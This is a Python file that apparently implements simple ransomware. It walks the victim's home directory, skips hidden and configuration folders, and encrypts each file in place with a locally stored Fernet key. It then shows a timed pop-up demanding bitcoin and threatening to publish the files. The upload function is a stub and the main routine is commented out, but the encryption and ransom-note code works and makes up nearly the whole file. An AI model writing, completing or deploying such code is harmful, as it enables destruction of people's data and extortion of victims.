import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64
import subprocess
import time
import signal

# Home directory
home = expanduser("~")



def send_file_to_server(file_path):
    return


def generate_key():
    if not os.path.isfile("./key.key"):
        key = Fernet.generate_key()
        with open("key.key", "wb") as the_key:
            the_key.write(key)


# Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
def list_safe_directories(directory):

    result = []
    excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])

    # Go through all of the directories and exlcude the ones in the excluded_dirs set
    for root, dirs, _ in os.walk(directory):
        dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]

        result.append(root)
        for directory in dirs:
            result.append(os.path.join(root, directory))

    return result  # Return the list of directories

# Method that retrieves all of the files in a directory and purposely does not include the ransomeware
def get_files_in_dir(directory):
    # change to home directory so that the paths are correct relative paths.
    os.chdir(directory)

    files = []
    for file in os.listdir(directory):
        # We do not want to encrypt our own ransomware
        if file == "mal.py" or file == "key.key":
            continue
        if os.path.isfile(file):
            files.append(file)

    return files


# Method for encrypting a single file
def encrypt_file(file, key):
    print("started")
    with open(file, "rb") as the_file:
        contents = the_file.read()

    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(encrypted_contents)
    print("terminated")


# Encrypt all the safe to encrypt files on a victims pc
def encrypt_and_send_all_files(directory, key):

    number_of_files = 0
    size_of_files = 0

    dir_list = list_safe_directories(home)
    for dir in dir_list:
        for file in get_files_in_dir(dir):
            file_path = os.path.join(dir, file)
            file_size = os.path.getsize(file_path)
            size_of_files += file_size
            number_of_files += 1

            # Send file to server
            send_file_to_server(file_path)

            # Encrypt file
            encrypt_file(file_path, key)

    print("Number of files encrypted: " + str(number_of_files))
    print("Total size of files: " + str(size_of_files))


def decrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        encrypted_contents = file.read()

    decrypted_contents = Fernet(key).decrypt(encrypted_contents)
    with open(file_path, "wb") as the_file:
        the_file.write(decrypted_contents)


def decrypt_all_files(directory, key):
    dir_list = list_safe_directories(home)
    for dir in dir_list:
        for file in get_files_in_dir(dir):
            file_path = os.path.join(dir, file)
            decrypt_file(file_path, key)


def display_popup(duration):



        start_time = time.time()
        remaining_time = duration

        while remaining_time > 0:
                # Format the remaining time as minutes and seconds
                minutes = int(remaining_time // 60)
                seconds = int(remaining_time % 60)

                        # Text to be displayed on the pop up
                text = f"HAHAHAHA, all your files are encrypted and stored on our sever!\nIf you pay us in the next <b>{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\nIf you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"
                # Show the dialog with the remaining time, keep refreshing the window.
                popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])

                # Update the remaining time
                elapsed_time = time.time() - start_time
                remaining_time = duration - elapsed_time
                time.sleep(1)
                popup.send_signal(signal.SIGTERM)



def main():
    generate_key()
    with open("key.key", "rb") as key:
        key = key.read()

    encrypt_and_send_all_files(home, key)
    display_popup("You have been hacked! Pay us now!")
    decrypt_all_files(home, key)


# main()


# print(list_safe_directories(directory))
display_popup(1000)
